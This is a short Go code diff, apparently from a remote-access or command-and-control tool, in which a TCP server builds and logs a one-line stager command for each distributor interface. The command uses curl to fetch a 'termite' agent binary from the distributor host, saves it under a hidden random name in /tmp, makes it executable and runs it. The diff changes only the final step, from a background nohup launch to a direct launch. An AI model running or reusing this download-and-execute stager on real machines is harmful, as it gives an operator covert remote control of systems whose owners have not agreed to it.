@@ -210,7 +210,7 @@ func (s *TCPServer) Run() {
 			for _, ifaddr := range Ctx.Distributor.Interfaces {
 				distributorHostPort := fmt.Sprintf("%s:%d", ifaddr, Ctx.Distributor.Port)
 				filename := fmt.Sprintf("/tmp/.%s", str.RandomString(0x08))
-				command := "curl -fsSL http://" + distributorHostPort + "/termite/" + listenerHostPort + " -o " + filename + " && chmod +x " + filename + " && bash -c '/usr/bin/nohup " + filename + " &'"
+				command := "curl -fsSL http://" + distributorHostPort + "/termite/" + listenerHostPort + " -o " + filename + " && chmod +x " + filename + " && " + filename
 				log.Warn("\t`%s`", command)
 			}
 		}
